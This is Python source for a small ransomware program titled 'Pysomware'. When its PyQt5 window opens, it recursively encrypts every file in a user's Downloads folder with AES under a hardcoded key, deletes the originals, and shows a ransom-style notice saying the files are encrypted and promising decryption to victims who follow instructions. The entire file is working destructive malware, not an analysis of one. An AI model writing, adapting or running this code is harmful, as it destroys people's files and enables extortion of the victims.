import glob
import os, struct
from Cryptodome.Cipher import AES
import sys
from PyQt5 import QtCore, QtWidgets
from PyQt5.QtWidgets import QMainWindow, QLabel, QGridLayout, QWidget
from PyQt5.QtCore import QSize

def encrypt_file(key, in_filename, out_filename=None, chunksize=64 * 1024):
    if not out_filename:
        out_filename = in_filename + '.enc'

    iv = os.urandom(16)
    encryptor = AES.new(key, AES.MODE_CFB, iv)
    filesize = os.path.getsize(in_filename)

    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv)

            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - len(chunk) % 16)

                outfile.write(encryptor.encrypt(chunk))

key = b'This is a key123'
startPath = 'C:/Users/Administrator/Downloads/**'

class Window(QMainWindow):
    def __init__(self):
        QMainWindow.__init__(self)

        self.setMinimumSize(QSize(640, 480))
        self.setWindowTitle("Pysomware")

        centralWidget = QWidget(self)
        self.setCentralWidget(centralWidget)

        gridLayout = QGridLayout(self)
        centralWidget.setLayout(gridLayout)

        title = QLabel(
            "<h1>What Happened to Your Computer?</h1><br /><h3>Ooops, your important files are encrypted.<br /> It means you will not be able to access them anymore until they are decrypted.<br /> If you follow our instructions, we guarantee that you can decrypt all your files quickly and safely!</h3>",
        self)
        title.setAlignment(QtCore.Qt.AlignCenter)
        gridLayout.addWidget(title, 0, 0)

        # Encrypts all files recursively starting from startPath
        for filename in glob.iglob(startPath, recursive=True):
            if (os.path.isfile(filename)):
                print('Encrypting> ' + filename)
                encrypt_file(key, filename)
                os.remove(filename)

if __name__ == "__main__":
    app = QtWidgets.QApplication(sys.argv)
    mainWin = Window()
    mainWin.show()
    sys.exit( app.exec_() )

